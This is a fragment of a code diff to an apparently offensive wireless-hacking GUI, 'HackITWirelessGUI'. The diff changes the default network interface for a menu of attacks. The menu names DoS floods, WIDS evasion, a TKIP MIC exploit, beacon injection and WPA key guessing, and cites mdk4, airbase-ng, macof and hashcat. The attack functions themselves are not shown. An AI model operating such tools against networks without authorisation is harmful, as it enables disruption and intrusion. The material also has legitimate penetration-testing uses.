+            ("TKIP MIC Exploit","do_tkip_mic","Forge QoS data",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("station","")]),
+            ("WIDS Evasion","do_wids_evasion","Rate-shift evasion",[("interface", LocalExecutor._detect_iface() or ""),("rate",1),("count",100),("band","2.4/5")]),
+            ("Fragmentation","do_frag_attack","Frame fragment bypass",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
+            ("Omerta Attack","do_omerta","Block probe responses",[("interface", LocalExecutor._detect_iface() or ""),("channel",6)]),
+            ("EAP Hammer","do_eap_hammer","802.1X DoS",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",500)]),
             ("Key Guessing","do_wpa_key_guess","Offline PMK guess",[("pmkid",""),("ssid",""),("wordlist","")]),
-            ("RRB Attack","do_rrb_attack","Beacon injection",[("interface","wlan0"),("bssid","")]),
-            ("CAPWAP Attack","do_capwap","CAPWAP control DoS",[("interface","wlan0"),("controller","")]),
-            ("HIRB","do_hirb","Hidden IRB bridge",[("interface","wlan0"),("target","")]),
-            ("WPA2 Group Key","do_wpa2_groupkey","Force rekey flood",[("interface","wlan0"),("bssid",""),("count",200)]),
-            ("Bridge Attack","do_bridge_attack","Wireless bridge exploit",[("interface","wlan0"),("bridge_ip","")]),
-            ("MAC Flooding","do_mac_flood","Switch CAM flood",[("interface","wlan0"),("count",5000),("rate",100)]),
-            ("Known Beacon","do_known_beacon","Enterprise SSIDs",[("interface","wlan0"),("list","enterprise"),("channel",6),("band","2.4/5")]),
+            ("RRB Attack","do_rrb_attack","Beacon injection",[("interface", LocalExecutor._detect_iface() or ""),("bssid","")]),
+            ("CAPWAP Attack","do_capwap","CAPWAP control DoS",[("interface", LocalExecutor._detect_iface() or ""),("controller","")]),
+            ("HIRB","do_hirb","Hidden IRB bridge",[("interface", LocalExecutor._detect_iface() or ""),("target","")]),
+            ("WPA2 Group Key","do_wpa2_groupkey","Force rekey flood",[("interface", LocalExecutor._detect_iface() or ""),("bssid",""),("count",200)]),
+            ("Bridge Attack","do_bridge_attack","Wireless bridge exploit",[("interface", LocalExecutor._detect_iface() or ""),("bridge_ip","")]),
+            ("MAC Flooding","do_mac_flood","Switch CAM flood",[("interface", LocalExecutor._detect_iface() or ""),("count",5000),("rate",100)]),
+            ("Known Beacon","do_known_beacon","Enterprise SSIDs",[("interface", LocalExecutor._detect_iface() or ""),("list","enterprise"),("channel",6),("band","2.4/5")]),
         ], "\U0001f4a5  OFFENSIVE NETWORK", "Real offensive tools via mdk4, airbase-ng, macof, hashcat", "Offensive")
 
     def _build_cracking(self):
@@ -1162,7 +1241,7 @@ class HackITWirelessGUI:
                  font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,4))
 
         ctrl = tk.Frame(f, bg=T["bg"]); ctrl.pack(fill="x", pady=(0,4))
-        r, e, self.airodump_iface = self._labeled(ctrl, "Iface", "wlan0")
+        r, e, self.airodump_iface = self._labeled(ctrl, "Iface", LocalExecutor._detect_iface() or "")
         r.pack(side="left", padx=(0,6))
         tk.Label(ctrl, text="Ch:", font=("Segoe UI",8), bg=T["bg"], fg=T["text_dim"]).pack(side="left")
         self.airodump_che = tk.Entry(ctrl, font=("Segoe UI",9), bg=T["surface"], fg=T["fg"],
@@ -1191,7 +1270,7 @@ class HackITWirelessGUI:
         return f
 
     def _ad_start(self):
-        iface = self.airodump_iface.get().strip() or "wlan0"
+        iface = self.airodump_iface.get().strip() or LocalExecutor._detect_iface() or ""
         ch = int(self.airodump_che.get().strip() or "11")
         self._ad_run(iface, ch)
 
